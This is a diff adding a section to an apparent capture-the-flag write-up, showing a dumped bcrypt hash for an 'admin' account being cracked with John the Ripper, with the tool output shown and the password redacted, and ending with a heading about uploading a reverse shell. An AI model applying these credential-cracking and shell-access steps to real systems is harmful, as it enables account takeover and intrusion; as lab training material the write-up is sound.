@@ -295,4 +295,28 @@ INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.
 
 Those are the last two lines out the grep search. The super duper user is admin.
 
+## Super Duper User! What is the password?
 
+The password hash is $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG. Judging by the start of $2y I am confident this is a bcrypt password. I put that hash into a file called hash.txt and I run the following command:
+
+```bash
+$ john hash.txt
+Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
+Use the "--format=bcrypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/opt/john/password.lst
+REDACTED         (?)
+1g 0:00:00:15 DONE 2/3 (2025-07-02 18:40) 0.06293g/s 46.44p/s 46.44c/s 46.44C/s yellow..allison
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+John was able to quickly crack this password.
+
+## At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?
